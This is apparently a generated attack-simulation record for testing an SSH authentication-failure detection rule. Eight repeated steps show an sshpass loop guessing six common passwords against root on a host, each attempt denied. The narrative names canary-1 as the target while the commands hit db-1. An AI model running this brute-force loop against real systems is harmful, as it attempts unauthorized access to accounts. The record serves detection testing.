1. Activity story

The activity runs as `sre.alice` from `office-ws-1`, directed at `db-1`.
It began at 2026-07-26T09:22:49+00:00 and finished at 2026-07-26T09:25:57+00:00.

Compromised office workstation hammers canary-1's SSH with wrong passwords from a non-privileged identity — classic rule-5710 (SSH invalid-user / auth-failure) territory. The signal is the burst of failed auth events on canary-1's sshd.

2. What was executed

Step 1 — on `office-ws-1` as `sre.alice`, from 2026-07-26T09:22:49+00:00 to 2026-07-26T09:23:09+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    Warning: Permanently added 'db-1' (ED25519) to the list of known hosts.
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).

Step 2 — on `office-ws-1` as `sre.alice`, from 2026-07-26T09:23:13+00:00 to 2026-07-26T09:23:35+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).

Step 3 — on `office-ws-1` as `sre.alice`, from 2026-07-26T09:23:39+00:00 to 2026-07-26T09:23:59+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).

Step 4 — on `office-ws-1` as `sre.alice`, from 2026-07-26T09:24:03+00:00 to 2026-07-26T09:24:23+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).

Step 5 — on `office-ws-1` as `sre.alice`, from 2026-07-26T09:24:27+00:00 to 2026-07-26T09:24:46+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).

Step 6 — on `office-ws-1` as `sre.alice`, from 2026-07-26T09:24:50+00:00 to 2026-07-26T09:25:10+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).

Step 7 — on `office-ws-1` as `sre.alice`, from 2026-07-26T09:25:14+00:00 to 2026-07-26T09:25:33+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).

Step 8 — on `office-ws-1` as `sre.alice`, from 2026-07-26T09:25:37+00:00 to 2026-07-26T09:25:57+00:00 (exit status 0):

    for pw in hunter2 password123 letmein admin secret qwerty; do
      sshpass -p "$pw" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 -o PreferredAuthentications=password \
        -o NumberOfPasswordPrompts=1 \
        root@db-1 true 2>&1 | head -1 || true
    done

It printed:

    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
    root@db-1: Permission denied (publickey,password).
